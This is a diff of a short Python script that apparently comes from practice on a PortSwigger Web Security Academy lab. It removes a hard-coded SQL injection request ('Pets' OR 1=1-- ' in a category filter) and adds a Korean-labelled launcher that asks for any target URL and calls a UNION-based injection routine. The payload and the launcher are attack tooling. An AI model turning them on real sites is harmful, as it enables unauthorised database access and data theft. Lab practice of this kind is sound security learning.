@@ -1,13 +1,15 @@
-import requests
+from union_sqli import run_union
 
-url = "https://0afa00b904241260806d807f0014006c.web-security-academy.net/filter?"
+def main():
+    print("=== SQL Injection 자동화 도구 ===")
 
-payload = "Pets' OR 1=1-- "
+    url = input("URL 입력 (예: https://target-lab-url.com/filter): ").strip()
 
-params = {
-    "category": payload
-}
+    if not url.startswith("http"):
+        print("❌ URL 형식이 이상함")
+        return
 
-res = requests.get(url, params=params)
+    run_union(url)
 
-print(res.text[:1000])
+if __name__ == "__main__":
+    main()
